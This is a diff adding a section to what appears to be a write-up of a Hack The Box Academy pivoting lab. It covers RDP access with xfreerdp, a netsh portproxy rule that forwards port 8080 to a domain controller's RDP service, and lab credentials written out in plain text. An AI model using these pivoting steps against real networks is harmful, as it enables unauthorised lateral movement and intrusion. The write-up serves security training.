@@ -266,5 +266,42 @@ curl --socks4 127.0.0.1:9050 172.16.5.135
 [![Screenshot-2025-03-04-124019.png](https://i.postimg.cc/CMj0997p/Screenshot-2025-03-04-124019.png)](https://postimg.cc/yWY2ZQ2L)
 
 
+## Port Forwarding with Windows Netsh
 
+* *RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"*
+
+* **Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)**
+
+
+I started by connecting to the Windows 10 target (10.129.42.198) using xfreerdp:
+
+```c
+xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
+```
+
+Once inside the Windows machine, I launched Command Prompt with Administrator Privileges to execute the necessary port forwarding commands.
+
+To forward external traffic from port 8080 on the Windows machine to the internal RDP service (172.16.5.19:3389), I ran:
+```c
+netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
+```
+
+I confirmed that the rule was added successfully with: 
+```c
+netsh.exe interface portproxy show v4tov4
+
+Listen on ipv4:             Connect to ipv4:
+--------------------------------------------------
+Address         Port        Address         Port
+10.129.42.198   8080        172.16.5.19     3389
+```
+Back on my Linux attack machine, I attempted an RDP connection to the internal machine by connecting to the Windows machine’s port 8080:
+
+```c
+xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
+```
+
+Once inside, I navigated to the Approved Vendors folder and opened the VendorContacts.txt file to retrieve the flag.
+
+[![Screenshot-2025-03-04-153024.png](https://i.postimg.cc/MpJBbn5J/Screenshot-2025-03-04-153024.png)](https://postimg.cc/MvtXzKg9)
 
